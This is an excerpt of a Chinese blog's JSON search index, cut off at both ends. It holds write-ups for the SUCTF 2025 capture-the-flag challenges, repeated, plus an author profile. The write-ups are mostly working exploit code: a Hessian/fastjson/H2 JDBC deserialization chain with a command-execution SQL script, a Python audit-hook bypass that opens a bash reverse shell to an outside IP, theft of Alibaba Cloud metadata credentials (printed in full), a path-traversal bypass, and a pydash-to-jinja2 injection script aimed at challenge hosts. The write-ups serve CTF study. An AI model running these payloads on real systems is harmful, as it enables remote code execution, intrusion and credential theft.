= multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/post/test/","section":"post","tags":null,"title":"SUCTF"},{"categories":null,"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) 这里_posixsubprocess.fork_exec这个hook是抓不了的，所以它等于白写\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) 直接拿shell，然后用pty升级一下自己的shell\n进shell之后要信息搜集一下，这里常用思路就是用cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... 与题目名字相结合，知道了关键信息\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 然后去看文档\n很明显在题目内是没有开加固模式的,我们这里直接访问就好\n然后拿到了一个ak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } 很明显就是要我们去oss🪣里看flag，上去发现被删了，不过没多大问题，这里我们看之前版本的内容就好了\nSU_blog 注册接口有个任意用户密码重置的洞，这里直接用admin做用户名就能重置admin的密码了\n也省了后面爆破jwt密钥的操作\n看到article里的传参，很明显的文件路径，这里尝试一下能不能路径穿越\n发现加../和不加是一样的，猜测后端进行了replace操作\n所以试一下双写..../，然后就能读了\n读到源码和waf(waf我这里用waf\u0026hellip;/py来绕过读到)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;未提供文件名。\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;大黑阔不许看\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无效的文件路径。\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;无权访问该文件。\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;文件未找到。\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;读取文件时发生错误。\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) 除了之前用到的接口，只剩下一个/Admin\n这里有一个原型链污染，不过题目要我们RCE，所以我们要结合一下jinja2的一个模版渲染\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwaf里数字只剩下2，也是指引我们打jinja2\n我们还需要获取sys模块，上面文章链接中的一个payload是用了__loader__，但是这题被ban了\n那我们只能用__spec__来代替__loader__来获取到sys模块\n因为模版编译只在第一次访问时才编译，所以要卡容器重启的第一时间才能打通\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery 由404页面可以很明显的知道是一个临时服务php -S开启的\n再根据去年出的一个洞，由php -S开启的服务在特定版本下能够读取源码\nhttps://cloud.tencent.com/developer/article/2235691\n所以这里也是有模学样的拿到源码\n后续打的时候碰到别人写的shell，然后用源码泄漏看参数就直接打进去了(这也是公共环境做题思路的一部分叭xsl)\n","date":"2025-01-18T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":" 1231 456 友链名称2 友链描述2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"友链"},{"categories":null,"contents":"一名大二在读学生\nSyclover \u0026amp; 0XFFF 成员\n对各种安全感兴趣，目前主要学习的还的是Web安全（Java 安全、云安全等）\n最爱吃，最喜欢吃的是🍉，最喜欢干的事情就是大夏天抱着半个西瓜拿勺子挖着吃然后看视频\n会打点小游戏（其实从小学之前就开始打游戏了hh\n什么都想学，但什么都不会\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":null,"contents":"SU_ez_solon 题目直接给了个hessian反序列化的接口\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } 不过他这个反序列化还给了一个toString()的调用\n然后再观察一下给的依赖\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2和fastjson这俩依赖写一起的，再加上上面的toString(),指向型很强了,就是让我们利用fastjson的getter打一个JDBC攻击\n做题过程 做题的时候找了有几个能打通的类，但都因为sofa-hessian自带的反序列化名单被做掉了\n我们需要知道在打h2的jdbc时，最后都会走向哪个类的哪个方法\norg.h2.jdbc.JdbcConnection.JdbcConnection()\n就是JdbcConnection的构造方法，以此为根据去找哪些getter会实例化一个JdbcConnection类\n这里可以写codeql来找，我有点懒没咋写，这里写我找到的两个方法\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource 第一个被黑名单ban了，但是它给了我们些许灵感，JdbcDataSource类实现了DataSource接口，继承这个接口的类都要重写getConnection()方法，所以我们可以去根据继承关系来寻找适合的方法\n所以我们找到了UnpooledDataSource方法，即不在黑名单上，而且他的构造方法和getConnection也很有意思\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } 构造方法会自动根据你的driverClassName来注册对应驱动类，然后getConnection()也会直接从DriverManager中进行Connection操作，泛用性很强\n然后后面常规打h2RCE的思路了，有一个SecurityManager要绕，其实直接调用setSecurityManager(null)就好了\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) 确实是很简单的一个云渗透\n前面要从python那里拿个shell，不过有hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, 